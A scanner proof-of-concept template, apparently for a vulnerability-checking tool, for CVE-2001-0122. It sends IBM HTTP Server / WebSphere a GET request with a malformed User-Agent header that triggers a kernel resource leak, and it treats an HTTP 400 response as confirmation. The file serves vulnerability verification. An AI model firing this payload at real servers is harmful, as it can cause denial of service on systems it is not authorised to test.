[info]
author = "ave"
description = "向 IBM HTTP Server 1.3.x / WebSphere 3.52 发送包含畸形 User-Agent 头的 HTTP 请求，触发 AfpaCache 内核资源泄漏，验证拒绝服务漏洞是否存在"
id = "POC-AVE-2001-0050"
name = "CVE-2001-0122 IBM HTTP Server AfpaCache DoS PoC"
severity = "medium"
tags = ["ave-2001-0050"]
vuln_id = [
    "CVE-2001-0122",
    "AVE-2001-0050",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
User-Agent = "20000xnull"

[[poc.requests.matchers]]
expect = true
status = [400]
type = "status"
